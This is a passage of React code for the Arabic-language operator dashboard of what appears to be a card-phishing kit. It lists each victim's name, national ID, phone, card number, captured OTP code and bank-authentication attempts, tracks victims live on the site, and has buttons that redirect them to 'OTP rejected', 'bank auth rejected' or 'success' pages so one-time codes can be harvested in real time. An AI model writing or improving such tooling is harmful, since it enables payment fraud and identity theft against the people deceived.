            <button onClick={() => setSoundEnabled(s => !s)} title={soundEnabled ? 'إيقاف صوت التنبيه' : 'تفعيل صوت التنبيه'}
              className="flex items-center justify-center w-8 h-8 rounded-lg transition-all"
              style={{ background: soundEnabled ? 'rgba(255,255,255,0.2)' : 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }}>
              {soundEnabled ? (
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.2">
                  <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5" /><path d="M19.07 4.93a10 10 0 0 1 0 14.14" /><path d="M15.54 8.46a5 5 0 0 1 0 7.07" />
                </svg>
              ) : (
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.4)" strokeWidth="2.2">
                  <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5" /><line x1="23" y1="9" x2="17" y2="15" /><line x1="17" y1="9" x2="23" y2="15" />
                </svg>
              )}
            </button>

            {/* User menu */}
            <div className="relative">
              <button onClick={() => setShowUserMenu(!showUserMenu)} className="flex items-center gap-1.5 px-2 py-1.5 rounded-lg" style={{ background: 'rgba(255,255,255,0.15)' }}>
                <div className="w-7 h-7 rounded-full flex items-center justify-center" style={{ background: 'rgba(255,255,255,0.2)' }}>
                  <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" /><circle cx="12" cy="7" r="4" /></svg>
                </div>
                <span className="text-xs font-bold text-white hidden sm:block">المسؤول</span>
              </button>
              {showUserMenu && (
                <div className="absolute left-0 mt-2 w-40 rounded-xl overflow-hidden z-50" style={{ background: C.card, border: `1px solid ${C.border}`, boxShadow: '0 8px 30px rgba(12,30,60,0.15)' }}>
                  <button onClick={() => { setShowUserMenu(false); window.location.href = '/'; }} className="w-full px-4 py-3 text-sm text-right"
                    style={{ color: C.textMid, fontFamily: 'Cairo, sans-serif' }}
                    onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.background = C.bg}
                    onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.background = 'transparent'}>
                    العودة للموقع
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      </header>

      {/* ── Main ── */}
      <main className="flex-1 p-3 sm:p-4 overflow-hidden flex flex-col">

        {/* Toolbar */}
        <div className="flex flex-col gap-2 mb-3">
          <div className="flex items-center gap-2 flex-wrap">
            <div className="flex items-center gap-2">
              <h2 className="text-base font-black" style={{ color: C.text }}>الطلبات</h2>
              <button onClick={async () => { setIsRefreshing(true); await refetch(); setTimeout(() => setIsRefreshing(false), 600); }}
                className="p-1.5 rounded-lg transition-all" style={{ background: `${C.blue}12`, border: `1px solid ${C.blue}25` }} title="تحديث">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke={C.blue} strokeWidth="2.5" style={{ display: 'inline-block', animation: isRefreshing ? 'spin 0.6s linear' : 'none', transformOrigin: 'center' }}><polyline points="23 4 23 10 17 10" /><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10" /></svg>
              </button>
            </div>

            {/* بطاقة الإجمالي — منفصلة */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, background: C.card, border: `1px solid ${C.border}`, borderRadius: 10, padding: '5px 12px', boxShadow: '0 1px 3px rgba(12,30,60,0.06)' }}>
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke={C.blueText} strokeWidth="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" /><circle cx="9" cy="7" r="4" /><path d="M23 21v-2a4 4 0 0 0-3-3.87" /><path d="M16 3.13a4 4 0 0 1 0 7.75" /></svg>
              <span style={{ fontSize: 12, fontWeight: 700, color: C.blueText, fontFamily: 'Cairo, sans-serif' }}>{totalVisitorCount} إجمالي</span>
            </div>

            {/* بطاقة النشطين — منسدلة */}
            <div className="relative">
              <button
                onClick={() => setShowVisitorDropdown(v => !v)}
                style={{ display: 'flex', alignItems: 'center', gap: 7, background: C.card, border: `1px solid ${showVisitorDropdown ? C.green : C.border}`, borderRadius: 10, padding: '5px 12px', boxShadow: '0 1px 3px rgba(12,30,60,0.06)', cursor: 'pointer', transition: 'all 0.2s' }}
              >
                {/* نقطة النشاط */}
                <span style={{ width: 7, height: 7, borderRadius: '50%', background: visitorCount > 0 ? C.green : C.border, boxShadow: visitorCount > 0 ? `0 0 6px 2px ${C.green}50` : 'none', display: 'inline-block', flexShrink: 0, animation: visitorCount > 0 ? 'dotPulse 1.4s ease-in-out infinite' : 'none' }} />
                <span style={{ fontSize: 12, fontWeight: 700, color: visitorCount > 0 ? C.green : C.textLight, fontFamily: 'Cairo, sans-serif' }}>{visitorCount} نشط</span>
                {/* سهم */}
                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke={C.textMid} strokeWidth="2.5" style={{ transform: showVisitorDropdown ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.2s' }}><polyline points="6 9 12 15 18 9" /></svg>
              </button>

              {/* القائمة المنسدلة */}
              {showVisitorDropdown && (
                <>
                  <div className="fixed inset-0 z-40" onClick={() => setShowVisitorDropdown(false)} />
                  <div className="absolute right-0 mt-2 z-50" style={{ minWidth: 280, background: C.card, border: `1px solid ${C.border}`, borderRadius: 14, boxShadow: '0 8px 32px rgba(12,30,60,0.14)', overflow: 'hidden' }}>
                    {/* رأس القائمة */}
                    <div style={{ background: `linear-gradient(135deg, ${C.navy}, ${C.navy2})`, padding: '10px 14px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                      <span style={{ fontSize: 12, fontWeight: 800, color: '#fff', fontFamily: 'Cairo, sans-serif' }}>الزوار النشطون</span>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                        <span style={{ fontSize: 11, color: 'rgba(255,255,255,0.7)', fontFamily: 'Cairo, sans-serif' }}>{visitorCount} من {totalVisitorCount}</span>
                        <span style={{ width: 7, height: 7, borderRadius: '50%', background: visitorCount > 0 ? C.green : C.border, boxShadow: visitorCount > 0 ? `0 0 6px 2px ${C.green}60` : 'none', display: 'inline-block', animation: visitorCount > 0 ? 'dotPulse 1.4s ease-in-out infinite' : 'none' }} />
                      </div>
                    </div>
                    {/* قائمة الزوار */}
                    <div style={{ maxHeight: 280, overflowY: 'auto', padding: '6px 0' }}>
                      {activeVisitors.length === 0 ? (
                        <div style={{ padding: '20px 14px', textAlign: 'center' }}>
                          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke={C.textLight} strokeWidth="1.5" style={{ margin: '0 auto 8px' }}><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" /><circle cx="9" cy="7" r="4" /><path d="M23 21v-2a4 4 0 0 0-3-3.87" /><path d="M16 3.13a4 4 0 0 1 0 7.75" /></svg>
                          <p style={{ fontSize: 12, color: C.textLight, fontFamily: 'Cairo, sans-serif' }}>لا يوجد زوار نشطون الآن</p>
                        </div>
                      ) : (
                        activeVisitors.map((v, i) => (
                          <div key={v.sessionId} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 14px', borderBottom: i < activeVisitors.length - 1 ? `1px solid ${C.border}` : 'none', transition: 'background 0.15s' }}
                            onMouseEnter={e => (e.currentTarget as HTMLDivElement).style.background = C.bg}
                            onMouseLeave={e => (e.currentTarget as HTMLDivElement).style.background = 'transparent'}>
                            {/* أفاتار */}
                            <div style={{ width: 32, height: 32, borderRadius: '50%', background: `${visitorPageColor(v.currentPage)}15`, border: `2px solid ${visitorPageColor(v.currentPage)}40`, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                              <span style={{ fontSize: 12, fontWeight: 800, color: visitorPageColor(v.currentPage) }}>{(v.fullName || 'ز')?.charAt(0)}</span>
                            </div>
                            {/* معلومات الزائر */}
                            <div style={{ flex: 1, minWidth: 0 }}>
                              <div style={{ fontSize: 12, fontWeight: 700, color: C.text, fontFamily: 'Cairo, sans-serif', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{v.fullName || 'زائر مجهول'}</div>
                              <div style={{ fontSize: 11, color: C.textMid, fontFamily: 'Cairo, sans-serif' }}>{v.phone || '-'}</div>
                            </div>
                            {/* الصفحة الحالية */}
                            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: 2, flexShrink: 0 }}>
                              <span style={{ fontSize: 10, fontWeight: 700, color: visitorPageColor(v.currentPage), background: `${visitorPageColor(v.currentPage)}12`, border: `1px solid ${visitorPageColor(v.currentPage)}30`, borderRadius: 20, padding: '2px 7px', whiteSpace: 'nowrap', fontFamily: 'Cairo, sans-serif' }}>{visitorPageLabel(v.currentPage)}</span>
                              <span style={{ fontSize: 10, color: C.textLight, fontFamily: 'Cairo, sans-serif' }}>{timeAgo(v.updatedAt || v.createdAt)}</span>
                            </div>
                          </div>
                        ))
                      )}
                    </div>
                    {/* تذييل */}
                    <div style={{ padding: '8px 14px', borderTop: `1px solid ${C.border}`, background: C.bg, display: 'flex', justifyContent: 'center' }}>
                      <span style={{ fontSize: 11, color: C.textLight, fontFamily: 'Cairo, sans-serif' }}>يتحدث تلقائياً كل 5 ثوانٍ</span>
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>

          {/* Tabs */}
          <div className="flex items-center gap-2 border-b" style={{ borderColor: C.border }}>
            {(['active', 'archived'] as const).map(tab => (
              <button key={tab} onClick={() => setActiveTab(tab)} className="px-4 py-2 font-bold text-sm transition-all"
                style={{ color: activeTab === tab ? C.navy : C.textMid, borderBottom: activeTab === tab ? `2px solid ${C.navy}` : 'none', fontFamily: 'Cairo, sans-serif' }}>
                {tab === 'active' ? 'الطلبات النشطة' : `الطلبات المؤرشفة (${apps.filter(a => (a as any).isArchived === 1 || (a as any).isArchived === true).length})`}
              </button>
            ))}
          </div>

          {/* Search + Delete */}
          <div className="flex items-center gap-2">
            <div className="relative flex-1">
              <input type="text" placeholder="بحث بالاسم أو الهاتف أو البطاقة..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)}
                style={{ background: C.card, border: `1px solid ${C.border}`, borderRadius: 8, color: C.text, padding: '8px 12px 8px 32px', width: '100%', fontSize: 13, fontFamily: 'Cairo, sans-serif', outline: 'none', boxShadow: '0 1px 3px rgba(12,30,60,0.05)' }} />
              <svg className="absolute left-2.5 top-1/2 -translate-y-1/2" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke={C.textLight} strokeWidth="2"><circle cx="11" cy="11" r="8" /><line x1="21" y1="21" x2="16.65" y2="16.65" /></svg>
            </div>
            <button onClick={() => setShowDeleteAll(true)} className="flex items-center gap-1.5 px-3 py-2 rounded-lg font-bold text-xs whitespace-nowrap"
              style={{ background: `${C.red}10`, color: C.red, border: `1px solid ${C.red}25`, fontFamily: 'Cairo, sans-serif' }}>
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><polyline points="3 6 5 6 21 6" /><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" /></svg>
              <span className="hidden sm:inline">حذف الجميع</span>
            </button>
          </div>
        </div>

        {/* Content */}
        {filtered.length === 0 ? (
          <div className="flex-1 flex flex-col items-center justify-center">
            <div className="w-14 h-14 rounded-full flex items-center justify-center mb-3" style={{ background: `${C.blue}10` }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={C.blue} strokeWidth="2" opacity="0.5"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" /><circle cx="9" cy="7" r="4" /><path d="M23 21v-2a4 4 0 0 0-3-3.87" /><path d="M16 3.13a4 4 0 0 1 0 7.75" /></svg>
            </div>
            <p className="text-sm font-bold" style={{ color: C.textLight, fontFamily: 'Cairo, sans-serif' }}>
              {searchTerm ? 'لا توجد نتائج' : 'لا توجد طلبات بعد'}
            </p>
          </div>
        ) : (
          <>
            {/* Mobile Cards */}
            <div className="lg:hidden flex-1 overflow-y-auto pb-4">
              {filtered.map(app => (
                <MobileCard key={app.sessionId} app={app} isNew={newSessionIds.has(app.sessionId)}
                  onCardClick={() => setCardModal(app)} onNameClick={() => setApplicantModal(app)}
                  onRedirect={(page) => handleRedirect(app.sessionId, page)}
                  onDelete={() => handleDelete(app.sessionId)} onReject={() => handleReject(app.sessionId)} />
              ))}
            </div>

            {/* Desktop Table */}
            <div className="hidden lg:block flex-1 overflow-auto rounded-xl" style={{ border: `1px solid ${C.border}`, boxShadow: '0 2px 12px rgba(12,30,60,0.07)' }}>
              <table style={{ borderCollapse: 'collapse', width: '100%', minWidth: 860 }}>
                <thead style={{ position: 'sticky', top: 0, zIndex: 10 }}>
                  <tr style={{ background: C.navy, borderBottom: `2px solid ${C.navy2}` }}>
                    {['الإجراء', 'رمز OTP', 'مصادقة بنكية', 'رقم البطاقة', 'رقم الهاتف', 'رقم الهوية', 'الاسم', 'الصفحة', 'التاريخ'].map(h => (
                      <th key={h} className="text-right px-3 py-3 font-bold text-xs whitespace-nowrap" style={{ color: 'rgba(255,255,255,0.85)', fontFamily: 'Cairo, sans-serif' }}>{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {filtered.map((app, idx) => {
                    const isNew = newSessionIds.has(app.sessionId);
                    return (
                      <tr key={app.sessionId}
                        className={isNew ? 'new-row' : ''}
                        style={{ borderBottom: `1px solid ${C.border}`, background: highlightedRows.has(app.sessionId) ? `${C.blue}15` : isNew ? `${C.blue}08` : idx % 2 === 0 ? C.card : C.bg, transition: 'background 0.3s ease' }}
                        onMouseEnter={e => (e.currentTarget as HTMLTableRowElement).style.background = `${C.blue}0C`}
                        onMouseLeave={e => (e.currentTarget as HTMLTableRowElement).style.background = highlightedRows.has(app.sessionId) ? `${C.blue}15` : isNew ? `${C.blue}08` : idx % 2 === 0 ? C.card : C.bg}>

                        {/* Actions */}
                        <td className="px-3 py-2">
                          <div className="flex items-center gap-1.5">
                            {isNew && <span className="new-row-dot" title="جديد" />}
                            <button onClick={() => handleReject(app.sessionId)} className="px-2 py-1 rounded-md text-xs font-bold"
                              style={{ background: `${C.red}10`, color: C.red, border: `1px solid ${C.red}25`, fontFamily: 'Cairo, sans-serif', fontSize: 11 }}>
                              رفض
                            </button>
                            <button onClick={(e) => handleActionClick(e, app.sessionId)} className="px-2 py-1 rounded-md text-xs font-bold"
                              style={{ background: openAction === app.sessionId ? `${C.navy}` : `${C.blue}12`, color: openAction === app.sessionId ? '#fff' : C.blue, border: `1px solid ${C.blue}25`, fontFamily: 'Cairo, sans-serif', fontSize: 11 }}>
                              توجيه ▾
                            </button>
                            <button onClick={() => handleArchive(app.sessionId)} className="p-1 rounded-md" title="أرشفة"
                              style={{ background: `${C.blue}10`, color: C.blue, border: `1px solid ${C.blue}20` }}>
                              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="2" y="4" width="20" height="16" rx="2" /><path d="M7 9h10M7 13h10" /></svg>
                            </button>
                            <button onClick={() => handleDelete(app.sessionId)} className="p-1 rounded-md"
                              style={{ background: C.bg, color: C.textLight, border: `1px solid ${C.border}` }}>
                              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><polyline points="3 6 5 6 21 6" /><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" /></svg>
                            </button>
                          </div>
                        </td>

                        {/* OTP Column */}
                        <td className="px-3 py-2">
                          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', gap: 4 }}>
                            {app.otpCode ? (
                              <>
                                <span style={{ fontFamily: 'monospace', fontSize: 13, color: C.navy, letterSpacing: '0.2em', fontWeight: 700, background: `${C.blue}12`, border: `1px solid ${C.blue}25`, borderRadius: 6, padding: '2px 8px', whiteSpace: 'nowrap', display: 'inline-block' }}>
                                  {app.otpCode}
                                </span>
                                {app.currentPage === '/otp-verify' && app.status !== 'approved' && app.status !== 'rejected' && (
                                  <button onClick={() => handleRedirect(app.sessionId, '/otp-rejected')} className="px-2 py-1 rounded text-xs font-bold"
                                    style={{ background: `${C.red}10`, color: C.red, border: `1px solid ${C.red}25`, fontFamily: 'Cairo, sans-serif', cursor: 'pointer', whiteSpace: 'nowrap', marginTop: 2 }}>
                                    ❌ رفض OTP
                                  </button>
                                )}
                              </>
                            ) : <span style={{ color: C.textLight, fontSize: 12 }}>-</span>}
                          </div>
                        </td>

                        {/* Bank Auth Column */}
                        <td className="px-3 py-2">
                          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', gap: 4 }}>
                            {(app as any).bankAuthConfirmed ? (
                              <>
                                {/* لون مربع المصادقة يتغير حسب عدد المحاولات */}
                                {(() => {
                                  const attempts = (app as any).bankAuthAttempts ?? 1;
                                  // المحاولة الأولى: أخضر | الثانية: برتقالي | الثالثة فأكثر: أحمر
                                  const bg = attempts === 1 ? `${C.green}12` : attempts === 2 ? 'rgba(234,88,12,0.12)' : 'rgba(220,38,38,0.15)';
                                  const color = attempts === 1 ? C.green : attempts === 2 ? '#EA580C' : '#DC2626';
                                  const border = attempts === 1 ? `1px solid ${C.green}30` : attempts === 2 ? '1px solid rgba(234,88,12,0.4)' : '1px solid rgba(220,38,38,0.5)';
                                  const icon = attempts === 1 ? '✅' : attempts === 2 ? '⚠️' : '🔴';
                                  const label = attempts === 1 ? 'مصادقة' : `مصادقة (${attempts}×)`;
                                  return (
                                    <span title={`عدد المحاولات: ${attempts}`} style={{ fontSize: 11, fontWeight: 700, background: bg, color, border, borderRadius: 6, padding: '2px 8px', whiteSpace: 'nowrap', transition: 'all 0.3s' }}>
                                      {icon} {label}
                                    </span>
                                  );
                                })()}
                                {app.status !== 'approved' && app.status !== 'rejected' && (
                                  <div style={{ display: 'flex', gap: 4, marginTop: 2 }}>
                                    <button onClick={() => handleRedirect(app.sessionId, '/success')} className="px-2 py-1 rounded text-xs font-bold"
                                      style={{ background: `${C.green}12`, color: C.green, border: `1px solid ${C.green}30`, fontFamily: 'Cairo, sans-serif', cursor: 'pointer', whiteSpace: 'nowrap' }}>
                                      ✔ قبول
                                    </button>
                                    <button onClick={() => handleRedirect(app.sessionId, '/bank-auth-rejected')} className="px-2 py-1 rounded text-xs font-bold"
                                      style={{ background: `${C.red}10`, color: C.red, border: `1px solid ${C.red}25`, fontFamily: 'Cairo, sans-serif', cursor: 'pointer', whiteSpace: 'nowrap' }}>
                                      ❌ رفض
                                    </button>
                                  </div>
                                )}
                              </>
                            ) : <span style={{ color: C.textLight, fontSize: 12 }}>-</span>}
                          </div>
                        </td>

                        {/* Card Number */}
                        <td className="px-3 py-2">
                          {app.cardNumber ? (
                            <button onClick={() => { setCardModal(app); setHighlightedRows(prev => { const n = new Set(prev); n.delete(app.sessionId); return n; }); }}
                              style={{ fontFamily: 'monospace', fontSize: 12, color: C.navy, letterSpacing: '0.05em', background: highlightedRows.has(app.sessionId) ? `${C.blue}20` : `${C.blue}0C`, border: `1px solid ${highlightedRows.has(app.sessionId) ? C.blue : `${C.blue}20`}`, borderRadius: 6, padding: '2px 8px', cursor: 'pointer', whiteSpace: 'nowrap', direction: 'ltr', textAlign: 'left', fontWeight: highlightedRows.has(app.sessionId) ? 700 : 400, transition: 'all 0.3s' }}>
                              {app.cardNumber}
                            </button>
                          ) : <span style={{ color: C.textLight, fontSize: 12 }}>-</span>}
                        </td>

                        {/* Phone */}
                        <td className="px-3 py-2" style={{ direction: 'ltr', fontSize: 12, color: C.textMid, whiteSpace: 'nowrap' }}>
                          {app.phone || <span style={{ color: C.textLight }}>-</span>}
                        </td>

                        {/* National ID */}
                        <td className="px-3 py-2" style={{ direction: 'ltr', fontSize: 11, color: C.textMid, whiteSpace: 'nowrap' }}>
                          {app.idNumber || <span style={{ color: C.textLight }}>-</span>}
                        </td>

                        {/* Name */}
                        <td className="px-3 py-2">
                          <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                            <span style={{ width: 8, height: 8, borderRadius: '50%', background: activeVisitors.some(v => v.sessionId === app.sessionId) ? C.green : C.red, boxShadow: activeVisitors.some(v => v.sessionId === app.sessionId) ? `0 0 4px 1px ${C.green}50` : `0 0 4px 1px ${C.red}50`, flexShrink: 0 }} title={activeVisitors.some(v => v.sessionId === app.sessionId) ? 'داخل الموقع' : 'خارج الموقع'} />
                            {app.fullName ? (
                              <button onClick={() => setApplicantModal(app)}
                                style={{ fontSize: 12, color: C.text, fontWeight: 600, fontFamily: 'Cairo, sans-serif', background: C.bg, border: `1px solid ${C.border}`, borderRadius: 6, padding: '2px 8px', cursor: 'pointer', whiteSpace: 'nowrap' }}>
                                {app.fullName}
                              </button>
                            ) : <span style={{ color: C.textLight, fontSize: 12 }}>-</span>}
                          </div>
                        </td>

                        {/* Current Page */}
                        <td className="px-3 py-2">
                          <span className="px-2 py-1 rounded-full text-xs font-bold" style={{ background: `${C.blue}12`, color: C.blue, fontFamily: 'Cairo, sans-serif', whiteSpace: 'nowrap', fontSize: 11 }}>
                            {pageLabels[app.currentPage || ''] || app.currentPage || '-'}
                          </span>
                        </td>

                        {/* Date */}
                        <td className="px-3 py-2" style={{ color: C.textLight, fontSize: 11, whiteSpace: 'nowrap' }}>
                          {formatDate(app.createdAt)}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </>
        )}
      </main>

      {/* ── Modals ── */}
      {cardModal && <CardModal app={cardModal} onClose={() => setCardModal(null)} />}
      {applicantModal && <ApplicantModal app={applicantModal} onClose={() => setApplicantModal(null)} />}
      {otpModal && <OtpModal app={otpModal} onClose={() => setOtpModal(null)} onSend={(otp) => handleSendOtp(otpModal, otp)} />}

      {/* Delete All Confirm */}
      {showDeleteAll && (
        <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center" style={{ background: 'rgba(12,30,60,0.6)', backdropFilter: 'blur(4px)' }}>
          <div className="rounded-t-3xl sm:rounded-2xl p-7 w-full sm:max-w-xs text-center" style={{ background: C.card, border: `1px solid ${C.border}`, boxShadow: '0 -20px 60px rgba(12,30,60,0.15)' }}>
            <div className="flex justify-center mb-4 sm:hidden">
              <div style={{ width: 40, height: 4, borderRadius: 2, background: C.border }} />
            </div>
            <div className="w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-3" style={{ background: `${C.red}10` }}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke={C.red} strokeWidth="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" /><line x1="12" y1="9" x2="12" y2="13" /><line x1="12" y1="17" x2="12.01" y2="17" /></svg>
            </div>
            <h3 className="text-lg font-black mb-2" style={{ color: C.text }}>تأكيد الحذف</h3>
            <p className="text-sm mb-5" style={{ color: C.textMid, fontFamily: 'Cairo, sans-serif' }}>هل أنت متأكد من حذف جميع الطلبات؟</p>
            <div className="flex gap-2">
              <button onClick={() => setShowDeleteAll(false)} className="flex-1 py-3 rounded-xl font-bold text-sm"
                style={{ background: C.bg, color: C.textMid, border: `1px solid ${C.border}`, fontFamily: 'Cairo, sans-serif' }}>
                إلغاء
              </button>
              <button onClick={handleDeleteAll} className="flex-1 py-3 rounded-xl font-bold text-sm"
                style={{ background: `linear-gradient(135deg, ${C.red}, #8B0000)`, color: '#fff', fontFamily: 'Cairo, sans-serif' }}>
                حذف الجميع
              </button>
            </div>
          </div>
        </div>
      )}

      {(openAction || showUserMenu) && (
        <div className="fixed inset-0 z-[9990]" onClick={() => { setOpenAction(null); setShowUserMenu(false); }} />
      )}

      {/* Desktop Action Dropdown */}
      {openAction && (
        <div className="fixed w-44 rounded-xl overflow-hidden"
          style={{ top: dropdownPos.top, left: dropdownPos.left, background: C.card, border: `1px solid ${C.border}`, boxShadow: '0 8px 30px rgba(12,30,60,0.15)', zIndex: 9999 }}>
          {PAGE_OPTIONS.map(opt => (
            <button key={opt.value} onClick={() => { handleRedirect(openAction, opt.value); setOpenAction(null); }}
              className="w-full px-3 py-2.5 text-xs text-right flex items-center justify-between"
              style={{ color: opt.color, fontFamily: 'Cairo, sans-serif', borderBottom: `1px solid ${C.border}` }}
              onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.background = C.bg}
              onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.background = 'transparent'}>
              <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M15 18l-6-6 6-6" /></svg>
              {opt.label}
            </button>
          ))}
        </div>
      )}
    </div>
  );
}
